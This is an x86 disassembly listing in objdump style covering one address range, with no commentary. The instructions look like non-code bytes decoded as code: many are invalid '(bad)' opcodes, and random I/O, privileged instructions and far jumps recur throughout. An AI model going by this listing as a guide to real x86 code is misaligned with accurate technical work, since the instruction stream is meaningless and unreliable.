  41a292:	lds    eax,FWORD PTR [ebp-0x49d1749c]
  41a298:	mov    ebx,0x5ce30d83
  41a29d:	hlt    
  41a29e:	mov    bh,dh
  41a2a0:	pop    eax
  41a2a1:	js     0x41a29b
  41a2a3:	sti    
  41a2a4:	nop
  41a2a5:	mov    esi,0x9294b269
  41a2aa:	js     0x41a260
  41a2ac:	sbb    eax,0x606bcb21
  41a2b1:	xchg   BYTE PTR [esi-0x336e7076],cl
  41a2b7:	retf   
  41a2b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2b9:	mov    ah,0xf5
  41a2bb:	retf   0x5959
  41a2be:	push   es
  41a2bf:	jb     0x41a29c
  41a2c1:	aam    0x21
  41a2c3:	nop
  41a2c4:	ficomp WORD PTR [eax+0x43]
  41a2c7:	xor    DWORD PTR [ecx*8-0x27c0ccff],esi
  41a2ce:	add    BYTE PTR ds:0x6d20f837,bl
  41a2d4:	pop    es
  41a2d5:	or     eax,0xe51a80e6
  41a2da:	jne    0x41a33d
  41a2dc:	imul   ecx,DWORD PTR [eax+edi*4],0x2c
  41a2e0:	fs jmp 0x2a593c4b
  41a2e6:	push   DWORD PTR [edi-0x64]
  41a2e9:	adc    DWORD PTR [edi-0x73],0x36
  41a2ed:	or     al,0xf0
  41a2ef:	ret    0x4cad
  41a2f2:	retf   0x2ab2
  41a2f5:	retf   0x64b6
  41a2f8:	(bad)  
  41a2f9:	push   ss
  41a2fa:	cld    
  41a2fb:	jbe    0x41a34e
  41a2fd:	mov    dh,0xb1
  41a2ff:	(bad)  
  41a301:	int3   
  41a302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a303:	adc    al,0x2c
  41a305:	and    esp,ecx
  41a307:	sbb    al,0x5d
  41a309:	cmp    BYTE PTR [ecx+esi*8-0x6f],dh
  41a30d:	hlt    
  41a30e:	jne    0x41a320
  41a310:	scas   eax,DWORD PTR es:[edi]
  41a311:	sbb    DWORD PTR [ebp-0x3a5bd475],edx
  41a317:	and    ecx,DWORD PTR [esi]
  41a319:	sbb    bh,bl
  41a31b:	(bad)  
  41a31c:	loop   0x41a354
  41a31e:	in     eax,dx
  41a31f:	push   ss
  41a320:	sub    eax,esi
  41a322:	mov    ch,0x3
  41a324:	sbb    BYTE PTR [ebp+ebp*1+0x3c],al
  41a328:	scas   al,BYTE PTR es:[edi]
  41a329:	push   ebx
  41a32a:	loope  0x41a2fb
  41a32c:	(bad)  
  41a32d:	mov    esi,0x3e81a6ac
  41a332:	sbb    ebp,DWORD PTR [ebp-0x571cb951]
  41a338:	es cmp ch,cl
  41a33b:	aas    
  41a33c:	pop    ebp
  41a33d:	or     dh,BYTE PTR [ebx-0x4157cf7]
  41a343:	cli    
  41a344:	mov    eax,0x34283254
  41a349:	jns    0x41a3bc
  41a34b:	stos   WORD PTR es:[edi],ax
  41a34d:	popf   
  41a34e:	fsub   DWORD PTR [ecx+0x3c]
  41a351:	dec    eax
  41a352:	inc    ecx
  41a353:	mov    ebp,0x73473c50
  41a358:	mov    DWORD PTR [edi-0x2a],eax
  41a35b:	fmul   QWORD PTR [ebx-0x36]
  41a35e:	test   eax,0xf39d75a3
  41a363:	mov    eax,ds:0xbf2bd8a7
  41a368:	gs inc eax
  41a36a:	pop    esi
  41a36b:	sti    
  41a36c:	mov    dh,0x93
  41a36e:	pop    ecx
  41a36f:	cmp    DWORD PTR [edi],edi
  41a371:	std    
  41a372:	add    eax,0x4347de2b
  41a377:	call   0x42101ed6
  41a37c:	lods   eax,DWORD PTR ds:[esi]
  41a37d:	outs   dx,DWORD PTR ds:[esi]
  41a37e:	out    dx,al
  41a37f:	jne    0x41a36d
  41a381:	lahf   
  41a382:	lods   al,BYTE PTR ds:[esi]
  41a383:	lds    ecx,FWORD PTR [edx+0x4c]
  41a386:	cld    
  41a387:	push   ebx
  41a388:	repnz or BYTE PTR [ecx+eax*1],0x1a
  41a38d:	jecxz  0x41a3e5
  41a38f:	inc    ebx
  41a390:	push   ds
  41a391:	pop    ecx
  41a392:	jnp    0x41a3ee
  41a394:	or     DWORD PTR [esi+0x2a],esp
  41a397:	push   ecx
  41a398:	test   DWORD PTR [esi],eax
  41a39a:	call   DWORD PTR [eax]
  41a39c:	arpl   WORD PTR [edi+0x670d69c7],ax
  41a3a2:	das    
  41a3a3:	aad    0xf1
  41a3a5:	cld    
  41a3a6:	iret   
  41a3a7:	or     eax,0x57cb4058
  41a3ac:	push   edx
  41a3ad:	adc    DWORD PTR [ebp-0x13a03700],0x0
  41a3b4:	push   ebx
  41a3b5:	in     eax,dx
  41a3b6:	jmp    0xcf96c683
  41a3bb:	add    al,0x87
  41a3bd:	adc    ecx,DWORD PTR [ebp-0x5]
  41a3c0:	popf   
  41a3c1:	shl    BYTE PTR [eax+0x12],0x9
  41a3c5:	mov    al,ds:0x4af1c92a
  41a3ca:	ds mov cl,0xb0
  41a3cd:	(bad)  
  41a3ce:	pusha  
  41a3cf:	ror    DWORD PTR [edx],cl
  41a3d1:	or     edi,0xa21745b1
  41a3d7:	mov    edx,0x5fca3bd1
  41a3dc:	out    dx,eax
  41a3dd:	mov    BYTE PTR [edx-0x3c854329],dl
  41a3e3:	mov    al,ds:0x15b60e11
  41a3e8:	adc    ebx,0x3e
  41a3eb:	in     eax,dx
  41a3ec:	add    BYTE PTR [ebx],cl
  41a3ee:	jno    0x41a379
  41a3f0:	jle    0x41a3ef
  41a3f2:	pop    edx
  41a3f3:	and    edi,ebp
  41a3f5:	jecxz  0x41a388
  41a3f7:	out    0x1b,eax
  41a3f9:	imul   esp,DWORD PTR [edx],0x75
  41a3fc:	sahf   
  41a3fd:	inc    edi
  41a3fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3ff:	imul   DWORD PTR [eax]
  41a401:	inc    ebp
  41a402:	sub    DWORD PTR [ecx],0x78063183
  41a408:	hlt    
  41a409:	pop    ebx
  41a40a:	jb     0x41a3b0
  41a40c:	scas   al,BYTE PTR es:[edi]
  41a40d:	dec    edx
  41a40e:	jge    0x41a436
  41a410:	mov    WORD PTR [ebx+edx*8+0x7bbeefed],?
  41a417:	mov    dh,0x76
  41a419:	push   ebp
  41a41a:	mov    ds:0x509bca1e,al
  41a41f:	loope  0x41a3fd
  41a421:	xchg   edx,eax
  41a422:	push   ds
  41a423:	add    BYTE PTR [edx-0x38],bh
  41a426:	xor    DWORD PTR fs:[eax-0x5284c0f8],eax
  41a42d:	(bad)  
  41a42e:	jbe    0x41a3d6
  41a430:	mov    al,0x75
  41a432:	mov    edx,DWORD PTR [ebx-0x4530a5ef]
  41a438:	ror    eax,1
  41a43a:	jle    0x41a482
  41a43c:	pop    edx
  41a43d:	aam    0x8f
  41a43f:	mov    ah,0x3d
  41a441:	dec    edi
  41a442:	lahf   
  41a443:	ret    
  41a444:	ret    
  41a445:	fidiv  WORD PTR [edx+0x27]
  41a448:	cs xchg ecx,eax
  41a44a:	call   0xf689:0x6de9f277
  41a451:	loope  0x41a46d
  41a453:	pop    edi
  41a454:	sub    al,BYTE PTR [ebx]
  41a456:	(bad)  
  41a457:	fcmovne st,st(5)
  41a459:	retf   0x1c92
  41a45c:	out    dx,eax
  41a45d:	inc    ebx
  41a45e:	jmp    0xecbb59c6
  41a463:	pushf  
  41a464:	push   0xc3c11a40
  41a469:	inc    eax
  41a46a:	mov    edi,0x9b9b32bc
  41a46f:	xlat   BYTE PTR ds:[ebx]
  41a470:	int3   
  41a471:	fcomip st,st(5)
  41a473:	mov    ds:0xe7c8b59a,al
  41a478:	xchg   ebx,eax
  41a479:	scas   eax,DWORD PTR es:[edi]
  41a47a:	iret   
  41a47b:	sub    eax,0xe7f4c019
  41a480:	mov    ds:0xeedad8a3,eax
  41a485:	mov    al,ds:0x628fa93c
  41a48a:	int    0x80
  41a48c:	dec    esi
  41a48d:	xchg   BYTE PTR [ecx],ah
  41a48f:	cwde   
  41a490:	inc    esi
  41a491:	add    bh,bh
  41a493:	bound  ebp,QWORD PTR [esi]
	...
  41a511:	add    BYTE PTR [eax],al
  41a513:	add    BYTE PTR [esi-0x77],bl
  41a516:	add    eax,0x7feed766
  41a51b:	mov    ecx,0x4f6277d8
  41a520:	xchg   esp,eax
  41a521:	stos   BYTE PTR es:[edi],al
  41a522:	test   DWORD PTR [edi+ebp*2+0x69000144],esp
  41a529:	pop    es
  41a52a:	add    BYTE PTR [eax],al
  41a52c:	mov    bl,0xb4
  41a52e:	xchg   ebp,eax
  41a52f:	fnsave [edx]
  41a531:	mov    al,0xb8
  41a533:	pop    edx
  41a534:	(bad)  
  41a535:	call   0x7a75b8cb
  41a53a:	cmp    ch,BYTE PTR [edi-0x6ad9788d]
  41a540:	add    DWORD PTR [ecx],0xfffffff7
  41a543:	jecxz  0x41a56d
  41a545:	fidivr WORD PTR [esi-0x7f]
  41a548:	pop    ebp
  41a549:	retf   
  41a54a:	cld    
  41a54b:	dec    edx
  41a54c:	out    0x9f,eax
  41a54e:	shr    DWORD PTR [edi],1
  41a550:	mov    ds:0xad00515a,eax
  41a555:	(bad)  
  41a556:	lods   eax,DWORD PTR ds:[esi]
  41a557:	jp     0x41a547
  41a559:	scas   eax,DWORD PTR es:[edi]
  41a55a:	popa   
  41a55b:	xchg   BYTE PTR [eax-0x69],dh
  41a55e:	loope  0x41a546
  41a560:	xchg   ebp,eax
  41a561:	mov    bl,0x42
  41a563:	mov    ecx,0x43eb5eac
  41a568:	mov    ds:0x82b1ac19,eax
  41a56d:	shr    DWORD PTR [ecx-0x7c615823],1
  41a573:	sbb    al,0xe
  41a575:	xor    al,0xee
  41a577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a578:	mov    WORD PTR [esi-0x9afa2dc],fs
  41a57e:	or     BYTE PTR [ebx+edi*8],bh
  41a581:	xchg   BYTE PTR [edx+0x43033d8e],bh
  41a587:	jmp    0xc3927d16
  41a58c:	adc    cl,BYTE PTR [esi-0x5e]
  41a58f:	mov    dx,0x424
  41a593:	or     bl,BYTE PTR [ebp+0x1f60eaa9]
  41a599:	mov    al,0x7a
  41a59b:	(bad)  
  41a59c:	rcr    dl,cl
  41a59e:	jno    0x41a55c
  41a5a0:	ror    DWORD PTR [edx-0x2ec2f55a],cl
  41a5a6:	push   edx
  41a5a7:	inc    esi
  41a5a8:	aam    0x2a
  41a5aa:	mov    esp,0x1443cf6b
  41a5af:	rcl    edx,0xbd
  41a5b2:	cmc    
  41a5b3:	je     0x41a556
  41a5b5:	cmp    cl,dh
  41a5b7:	in     al,dx
  41a5b8:	cld    
  41a5b9:	ret    0xdaf9
  41a5bc:	fwait
  41a5bd:	data16 loopne 0x41a5c1
  41a5c0:	xor    ecx,DWORD PTR ds:0x4e333167
  41a5c6:	xchg   ebx,eax
  41a5c7:	push   edx
  41a5c8:	ds data16 jno 0x41a5c5
  41a5cc:	xchg   esp,eax
  41a5cd:	call   0x17b1:0xd47b8e32
  41a5d4:	out    dx,al
  41a5d5:	sbb    ebx,DWORD PTR [ebp-0x51cac70]
  41a5db:	ror    eax,1
  41a5dd:	fwait
  41a5de:	xchg   DWORD PTR [eax+eax*2+0x1d],eax
  41a5e2:	mov    gs,esp
  41a5e4:	mov    edx,0xa63b528c
  41a5e9:	retf   
  41a5ea:	xchg   ebx,eax
  41a5eb:	xchg   BYTE PTR [ecx+0x28daea90],ah
  41a5f1:	push   ebx
  41a5f2:	dec    ebx
  41a5f3:	jno    0x41a626
  41a5f5:	enter  0x8821,0x85
  41a5f9:	adc    eax,DWORD PTR gs:[ecx+esi*2]
  41a5fd:	rol    DWORD PTR [ebp+0x46],0x29
  41a601:	mov    edi,DWORD PTR [eax+0xfc9749c]
  41a607:	adc    BYTE PTR [edx+eiz*8],dh
  41a60a:	pop    ecx
  41a60b:	in     al,0x72
  41a60d:	push   esp
  41a60e:	nop
  41a60f:	bnd jle 0x41a5c7
  41a612:	out    0x2e,al
  41a614:	out    0xa3,eax
  41a616:	std    
  41a617:	pop    ecx
  41a618:	jbe    0x41a666
  41a61a:	aas    
  41a61b:	push   ss
  41a61c:	jae    0x41a63a
  41a61e:	sub    BYTE PTR [ebp-0xe02dca5],bl
  41a624:	pop    es
  41a625:	push   eax
  41a626:	sub    dl,BYTE PTR [ebx+0x15]
  41a629:	xor    eax,0x4e97e9dd
  41a62e:	shl    edi,cl
  41a630:	pop    ebx
  41a631:	pop    ecx
  41a632:	out    dx,al
  41a633:	retf   
  41a634:	ins    BYTE PTR es:[edi],dx
  41a635:	xchg   ecx,eax
  41a636:	jae    0x41a62b
  41a638:	data16 jl 0x41a650
  41a63b:	jmp    0x96e2bc9e
  41a640:	add    al,0x66
  41a642:	and    DWORD PTR [ebx-0x3e1316f4],0xa7142aeb
  41a64c:	push   cs
  41a64d:	mov    al,0x7f
  41a64f:	daa    
  41a650:	cdq    
  41a651:	and    al,0x46
  41a653:	aas    
  41a654:	inc    ecx
  41a655:	loopne 0x41a5f0
  41a657:	mov    ecx,0x99471378
  41a65c:	push   edx
  41a65d:	and    al,0xb0
  41a65f:	in     eax,dx
  41a660:	push   ds
  41a661:	aaa    
  41a662:	out    dx,al
  41a663:	cmp    edi,DWORD PTR [ebx-0x1d68034c]
  41a669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a66a:	mov    ah,0x28
  41a66c:	iret   
  41a66d:	and    DWORD PTR [ecx+0x2077c071],ebx
  41a673:	and    edi,ebp
  41a675:	test   DWORD PTR [ecx+0xedb1cb2],esp
  41a67b:	jns    0x41a637
  41a67d:	jmp    0x57a148d1
  41a682:	call   0x8432:0x438705b5
  41a689:	pop    ecx
  41a68a:	ja     0x41a6c7
  41a68c:	mov    bh,BYTE PTR [esi+0x72e0798b]
  41a692:	gs in  al,dx
  41a694:	inc    edi
  41a695:	cmp    dh,BYTE PTR [eax-0x25]
  41a698:	fnstenv [ebx+0x45cab5b1]
  41a69e:	push   edi
  41a69f:	push   ebx
  41a6a0:	repz out 0x5c,eax
  41a6a3:	mov    esi,0xcc28bfbe
  41a6a8:	jne    0x41a680
  41a6aa:	call   0xcf528d95
  41a6af:	fnstcw WORD PTR [ebx-0x4e9f9c8c]
  41a6b5:	sbb    DWORD PTR [ebp-0x2c],ebp
  41a6b8:	add    eax,0x7158bdf2
  41a6bd:	cmp    al,0x81
  41a6bf:	add    bl,cl
  41a6c1:	out    dx,al
  41a6c2:	hlt    
  41a6c3:	mov    ch,0xdd
  41a6c5:	mov    esi,ebp
  41a6c7:	dec    ebx
  41a6c8:	add    ecx,DWORD PTR [ebp+edi*1-0x6c5b153c]
  41a6cf:	xchg   ebx,eax
  41a6d0:	enter  0xf2d8,0x9a
  41a6d4:	sbb    al,0xc8
  41a6d6:	pop    esp
  41a6d7:	and    al,BYTE PTR [eax]
  41a6d9:	dec    edi
  41a6da:	int3   
  41a6db:	dec    DWORD PTR [ebp-0x1f39d75d]
  41a6e1:	fidiv  WORD PTR [edx+0x4]
  41a6e5:	ficom  DWORD PTR [ecx+0xe7d94e3]
  41a6eb:	inc    eax
  41a6ec:	xor    edx,DWORD PTR [ebx]
  41a6ee:	fadd   DWORD PTR [eax]
  41a6f0:	mov    ebx,0x77cfa56d
  41a6f5:	or     DWORD PTR [ebp+0x791249f0],ecx
  41a6fb:	pop    esi
  41a6fc:	js     0x41a6d8
  41a6fe:	xchg   edx,eax
  41a6ff:	cmp    eax,0xf6d969ce
  41a704:	fstp   TBYTE PTR [ebx+0x41f295]
  41a70a:	lods   al,BYTE PTR ds:[esi]
  41a70b:	mov    edi,DWORD PTR [ebx]
  41a70d:	inc    esi
  41a70e:	mov    esi,0xe117fa1b
  41a713:	mov    dl,0x74
  41a715:	sub    eax,0x1de90c37
  41a71a:	inc    ecx
  41a71b:	retf   0x87bf
  41a71e:	call   0x69d6:0x2fab4bb9
  41a725:	cwde   
  41a726:	push   es
  41a727:	mov    fs,ebx
  41a729:	mov    ch,0xfe
  41a72b:	out    0x84,al
  41a72d:	stos   BYTE PTR es:[edi],al
  41a72e:	test   eax,0x53a858f
  41a733:	pop    edi
  41a734:	dec    eax
  41a735:	ror    BYTE PTR [ebx+0x49],cl
  41a738:	mov    BYTE PTR [ecx+esi*4],bh
  41a73b:	out    0xe4,eax
  41a73d:	or     BYTE PTR [edi-0x29668b26],0x3
  41a744:	(bad)  
  41a745:	jae    0x41a74c
  41a747:	shl    BYTE PTR [ebp-0x16deffd2],1
  41a74d:	in     eax,0x56
  41a74f:	cmp    DWORD PTR [edi*8+0x4f080d49],edi
  41a756:	in     eax,dx
  41a757:	xor    edi,edx
  41a759:	sahf   
  41a75a:	stos   DWORD PTR es:[edi],eax
  41a75b:	call   0x7f2c6cd5
  41a760:	ret    0xc088
  41a763:	lds    esi,FWORD PTR [ebp-0x6b0de713]
  41a769:	adc    eax,0x6bd42b7f
  41a76e:	xlat   BYTE PTR ds:[ebx]
  41a76f:	mov    bh,0x4e
  41a771:	jnp    0x41a728
  41a773:	pop    ecx
  41a774:	sub    ax,0x9a90
  41a778:	pop    esi
  41a779:	mov    al,ds:0x9de9c87a
  41a77e:	inc    eax
  41a77f:	pop    ebx
  41a780:	sub    BYTE PTR [edi+0x40e1590e],dl
  41a786:	xor    eax,ebp
  41a788:	and    eax,0x7b65e477
  41a78d:	mov    ebp,0xb430070a
  41a792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a793:	cli    
  41a794:	aad    0xb2
  41a796:	jnp    0x41a788
  41a798:	out    dx,eax
  41a799:	add    eax,0x289dcfb
  41a79e:	shl    BYTE PTR [eax+0x46356463],cl
  41a7a4:	dec    edi
  41a7a5:	pop    edx
  41a7a6:	hlt    
  41a7a7:	pop    ebx
  41a7a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7a9:	ins    DWORD PTR es:[edi],dx
  41a7aa:	push   ds
  41a7ab:	stc    
  41a7ac:	mov    ah,0x57
  41a7ae:	test   dh,0x74
  41a7b1:	dec    eax
  41a7b2:	sbb    BYTE PTR [esi],dh
  41a7b4:	imul   eax
  41a7b6:	or     dh,BYTE PTR [ecx]
  41a7b8:	jmp    0x41a779
  41a7ba:	inc    edx
  41a7bb:	arpl   WORD PTR [edx],dx
  41a7bd:	jmp    0x41a78a
  41a7bf:	popf   
  41a7c0:	shl    DWORD PTR [edx+0x1b1599f2],1
  41a7c6:	and    eax,0x865f8935
  41a7cb:	cld    
  41a7cc:	add    DWORD PTR [ebp+0x4c],ecx
  41a7cf:	sub    eax,0x26db5bfc
  41a7d4:	inc    edi
  41a7d5:	cmp    ebx,DWORD PTR [esi]
  41a7d7:	fisttp QWORD PTR [eax-0x2ed8055e]
  41a7dd:	xchg   ecx,eax
  41a7de:	pop    ebp
  41a7df:	mov    ebx,0x10a73e8c
  41a7e4:	daa    
  41a7e5:	inc    edi
  41a7e6:	and    eax,0xaa28316d
  41a7eb:	cmp    ch,BYTE PTR [ebp+0x20a8124b]
  41a7f1:	cmp    eax,0xda3c3a93
  41a7f6:	and    al,0xcb
  41a7f8:	mov    eax,ds:0xe812b963
  41a7fd:	inc    edx
  41a7fe:	pop    ecx
  41a7ff:	call   0xa191d383
  41a804:	loopne 0x41a801
  41a806:	lock repz fbstp TBYTE PTR ds:0xa7d4284a
  41a80e:	inc    edi
  41a80f:	and    BYTE PTR [ebx],dl
  41a811:	mov    cl,0xe9
  41a813:	adc    DWORD PTR [edx-0x40a8a51f],0x40db8387
  41a81d:	cmp    DWORD PTR [ebx],0xffffffad
  41a820:	adc    al,0x9d
  41a822:	popa   
  41a823:	fucom  st(1)
  41a825:	pop    ecx
  41a826:	mov    ds:0xf887b19d,al
  41a82b:	jnp    0x41a81d
  41a82d:	jno    0x41a8a6
  41a82f:	pop    ds
  41a830:	cmp    ch,cl
  41a832:	rol    bl,cl
  41a834:	sbb    DWORD PTR [ebp+ebx*8+0x2],edi
  41a838:	aam    0x91
  41a83a:	in     eax,dx
  41a83b:	(bad)  
  41a83c:	jmp    0x22eb:0xa580715b
  41a843:	mov    esi,0x3bff6d5f
  41a848:	test   DWORD PTR [eax],edi
  41a84a:	inc    ecx
  41a84b:	ficom  DWORD PTR [esi-0x52282b48]
  41a851:	mov    edi,0x4daa20bd
  41a856:	sub    DWORD PTR [edx+0x61074de4],0x2f
  41a85d:	mov    cl,dh
  41a85f:	faddp  st(6),st
  41a861:	mov    ds:0x7362b2b8,al
  41a866:	pop    ebp
  41a867:	scas   al,BYTE PTR es:[edi]
  41a868:	pop    edi
  41a869:	xchg   BYTE PTR [ecx-0x71fd1a82],dh
  41a86f:	test   edi,ebx
  41a871:	out    0x60,eax
  41a873:	xchg   ebp,eax
  41a874:	xor    DWORD PTR [edx],edx
  41a876:	pop    esi
  41a877:	aaa    
  41a878:	xor    al,0xfe
  41a87a:	imul   ecx,DWORD PTR es:[eax+0x34],0xffffff81
  41a87f:	popa   
  41a880:	cmp    esi,ebx
  41a882:	or     eax,0x69e67f4f
  41a887:	jge    0x41a900
  41a889:	inc    ecx
  41a88a:	inc    edx
  41a88b:	mov    ah,0xa2
  41a88d:	ja     0x41a858
  41a88f:	cdq    
  41a890:	mov    ecx,0xc4c49fa
  41a895:	jb     0x41a886
  41a897:	iret   
  41a898:	push   0xcc880245
  41a89d:	(bad)  
  41a89e:	sbb    BYTE PTR [ebp+0x2f],dh
  41a8a1:	and    al,dl
  41a8a3:	push   ds
  41a8a4:	mov    ch,0xe4
  41a8a6:	or     bh,BYTE PTR [edi+0x1f]
  41a8a9:	dec    ecx
  41a8aa:	fldenv [esi+0x431a04b5]
  41a8b0:	call   0x3bd9:0xd137ddc7
  41a8b7:	xlat   BYTE PTR ds:[ebx]
  41a8b8:	and    DWORD PTR [ebp+0x3223f9b],eax
  41a8be:	mov    ebp,0x58110a30
  41a8c3:	xor    DWORD PTR [esi+0x27],ebx
  41a8c6:	(bad)  
  41a8c7:	push   ebp
  41a8c8:	xor    dh,BYTE PTR [eax+0x3e99d9cd]
  41a8ce:	retf   
  41a8cf:	(bad)  
  41a8d1:	and    bh,BYTE PTR ds:0x27379ff1
  41a8d7:	fbstp  TBYTE PTR [esi+0x11]
  41a8da:	test   DWORD PTR [eax+0x21],eax
  41a8dd:	jp     0x41a89f
  41a8df:	dec    ebx
  41a8e0:	push   edi
  41a8e1:	scas   al,BYTE PTR es:[edi]
  41a8e2:	mov    ecx,0xc1b39adf
  41a8e7:	pop    ss
  41a8e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8e9:	aaa    
  41a8ea:	mov    bh,0xa2
  41a8ec:	inc    edx
  41a8ed:	mov    esp,DWORD PTR [ebx]
  41a8ef:	pop    edi
  41a8f0:	call   0x8f0:0xc39f2c00
  41a8f7:	lods   al,BYTE PTR ds:[esi]
  41a8f8:	jle    0x41a907
  41a8fa:	scas   eax,DWORD PTR es:[edi]
  41a8fb:	daa    
  41a8fc:	pushf  
  41a8fd:	popf   
  41a8fe:	pop    es
  41a8ff:	add    esi,DWORD PTR [ebx]
  41a901:	xor    ch,bh
  41a903:	jo     0x41a962
  41a905:	push   edi
  41a906:	jp     0x41a969
  41a908:	(bad)  
  41a90a:	mov    ebp,eax
  41a90c:	ins    BYTE PTR es:[edi],dx
  41a90d:	repz and ecx,ecx
  41a910:	mov    dl,0x5e
  41a912:	xchg   ebp,eax
  41a913:	xchg   esp,eax
  41a914:	fnstenv [edx+0x52]
  41a917:	dec    esi
  41a918:	jne    0x41a8c3
  41a91a:	shl    esi,cl
  41a91c:	ret    0x4bad
  41a91f:	mov    DWORD PTR [edi+0x51],ebp
  41a922:	pop    esp
  41a923:	push   edx
  41a924:	shl    DWORD PTR [edi+ebp*4-0x19f73aa6],0x61
  41a92c:	xchg   ecx,eax
  41a92d:	in     al,0xd5
  41a92f:	or     DWORD PTR [ebx-0xd],eax
  41a932:	cmp    al,0xda
  41a934:	fst    DWORD PTR [edx-0x23]
  41a937:	loopne 0x41a8fb
  41a939:	fwait
  41a93a:	pusha  
  41a93b:	fldlg2 
  41a93d:	mov    edi,0xf6e81e52
  41a942:	push   ebx
  41a943:	adc    dh,ah
  41a945:	adc    esi,DWORD PTR [ebx+0x6ebdc17e]
  41a94b:	data16 xlat BYTE PTR ds:[ebx]
  41a94d:	cdq    
  41a94e:	(bad)  
  41a950:	xchg   edx,eax
  41a951:	neg    BYTE PTR [edi+0x52d7ef5c]
  41a957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a958:	sub    DWORD PTR [ecx+edx*8+0x1d],ebx
  41a95c:	jb     0x41a9c0
  41a95e:	fdivr  DWORD PTR [esp+ecx*4+0x49]
  41a962:	push   ebx
  41a963:	jp     0x41a98d
  41a965:	cmc    
  41a966:	mov    dl,0x5f
  41a968:	xchg   edi,eax
  41a969:	and    eax,0x51c17dae
  41a96e:	pop    ss
  41a96f:	std    
  41a970:	adc    dh,dl
  41a972:	mov    bl,0xb9
  41a974:	push   esp
  41a975:	iret   
  41a976:	in     al,0x7
  41a978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a979:	jnp    0x41a90c
  41a97b:	cmp    eax,0x157c9503
  41a980:	retf   
  41a981:	fnstenv [ebp+0xed041be]
  41a987:	jmp    0x4a67:0x497719da
  41a98e:	int3   
  41a98f:	cmp    al,0x5
  41a991:	arpl   dx,dx
  41a993:	ret    
  41a994:	mov    gs,WORD PTR [edi+0x58]
  41a997:	add    al,0xb9
  41a999:	sahf   
  41a99a:	jl     0x41aa0d
  41a99c:	fsubr  DWORD PTR [ebx+0x39d00be6]
  41a9a2:	cmp    cl,bl
  41a9a4:	(bad)  
  41a9a5:	xchg   esp,eax
  41a9a6:	mov    eax,0xd860f061
  41a9ab:	aad    0x8e
  41a9ad:	sbb    ebp,ebx
  41a9af:	push   ecx
  41a9b0:	out    dx,eax
  41a9b1:	leave  
  41a9b2:	cmp    BYTE PTR [edi-0x3],cl
  41a9b5:	mov    bh,0xf2
  41a9b7:	outs   dx,BYTE PTR ds:[esi]
  41a9b8:	retf   0x6488
  41a9bb:	inc    esi
  41a9bc:	dec    eax
  41a9bd:	push   ebx
  41a9be:	cmp    esi,ecx
  41a9c0:	dec    esi
  41a9c1:	sub    dl,bh
  41a9c3:	or     esp,DWORD PTR [ecx-0x31bac9ac]
  41a9c9:	popa   
  41a9ca:	rol    DWORD PTR [ebx+0x10c3816f],1
  41a9d0:	cld    
  41a9d1:	sub    cl,BYTE PTR [edi-0x1]
  41a9d4:	sub    ebx,ebx
  41a9d6:	push   ebx
  41a9d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9d8:	loopne 0x41a9e8
  41a9da:	or     eax,0x80dc4493
  41a9df:	push   eax
  41a9e0:	out    0x84,eax
  41a9e2:	xor    dl,cl
  41a9e4:	mov    ds:0xb3ae27a9,al
  41a9e9:	cmp    DWORD PTR [edx-0x5cd29380],ecx
  41a9ef:	inc    esi
  41a9f0:	retf   0x32e9
  41a9f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9f4:	sbb    BYTE PTR [eax+ecx*1-0x5c],dh
  41a9f8:	push   es
  41a9f9:	xlat   BYTE PTR ds:[ebx]
  41a9fa:	fistp  DWORD PTR [ecx-0x3a07cff0]
  41aa00:	jmp    0x41a99a
  41aa02:	add    DWORD PTR [edx+edi*8],ebp
  41aa05:	les    edi,FWORD PTR [eax+0x1f]
  41aa08:	test   al,0xe3
  41aa0a:	xchg   DWORD PTR ds:0x913e988f,esp
  41aa10:	sub    BYTE PTR [ebp+0x6e7e3dc1],al
  41aa16:	dec    esp
  41aa17:	mov    eax,0x5c2f9b6e
  41aa1c:	mov    esp,0x215399f4
  41aa21:	dec    ecx
  41aa22:	xchg   DWORD PTR [ebx-0x63],edi
  41aa25:	jae    0x41a9d0
  41aa27:	mov    eax,ds:0x7356f6de
  41aa2c:	popa   
  41aa2d:	(bad)  
  41aa2e:	ds mov esp,0x2caa459
  41aa34:	jo     0x41aa06
  41aa36:	fucomi st,st(4)
  41aa38:	inc    ebx
  41aa39:	mov    BYTE PTR [eax],bl
  41aa3b:	mov    ecx,0xac3b6c35
  41aa40:	and    al,0xd
  41aa42:	push   edi
  41aa43:	rcr    DWORD PTR [ecx],0x4c
  41aa46:	add    al,0x1b
  41aa48:	xchg   edi,eax
  41aa49:	mov    al,ds:0x34ad471d
  41aa4e:	jmp    0x6ff50f0
  41aa53:	sbb    BYTE PTR [esi-0x2dfa31ed],0x70
  41aa5a:	sub    BYTE PTR [eax],ch
  41aa5c:	sbb    eax,0x1290a0fe
  41aa61:	fnsetpm(287 only) 
  41aa63:	sub    DWORD PTR [ebx-0x4c74c261],ecx
  41aa69:	(bad)  
  41aa6a:	mov    ah,0x46
  41aa6c:	outs   dx,DWORD PTR ds:[esi]
  41aa6d:	inc    ebx
  41aa6e:	xor    eax,0x44424bb4
  41aa73:	mov    cl,0x51
  41aa75:	in     eax,dx
  41aa76:	enter  0x7a31,0x79
  41aa7a:	adc    eax,0x6dea2828
  41aa7f:	pusha  
  41aa80:	out    dx,al
  41aa81:	xor    edx,edx
  41aa83:	inc    esp
  41aa84:	push   ebx
  41aa85:	retf   
  41aa86:	push   0x36c6f504
  41aa8b:	retf   
  41aa8c:	and    al,0x99
  41aa8e:	test   BYTE PTR [edx-0x3d],dh
  41aa91:	inc    ecx
  41aa92:	jle    0x41aae8
  41aa94:	ror    DWORD PTR [edi],1
  41aa96:	push   edi
  41aa97:	aas    
  41aa98:	int3   
  41aa99:	adc    eax,0x17f4e337
  41aa9e:	inc    eax
  41aa9f:	sbb    eax,DWORD PTR [edx+0x52]
  41aaa2:	fldenv [edx+ebp*2]
  41aaa5:	aad    0x3b
  41aaa7:	(bad)  
